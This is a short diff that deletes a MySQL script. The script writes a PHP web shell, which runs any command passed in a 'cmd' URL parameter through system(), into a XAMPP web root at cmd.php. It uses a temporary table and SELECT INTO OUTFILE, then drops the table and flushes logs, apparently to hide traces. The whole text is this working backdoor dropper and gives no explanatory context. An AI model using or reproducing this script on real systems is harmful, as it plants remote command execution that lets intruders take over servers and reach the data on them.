@@ -1,7 +1,0 @@
-use mysql;
-DROP TABLE IF EXISTS `temptab`;
-CREATE TABLE temptab (codetab text);
-INSERT INTO temptab (codetab) values ('<? $cmd = $_GET["cmd"]; if (!empty($cmd)) { echo "<pre>"; system($cmd); echo "</pre>"; exit; } ?>');
-SELECT * INTO OUTFILE 'C:/xampp/htdocs/cmd.php' from temptab;
-DROP TABLE temptab;
-FLUSH LOGS;
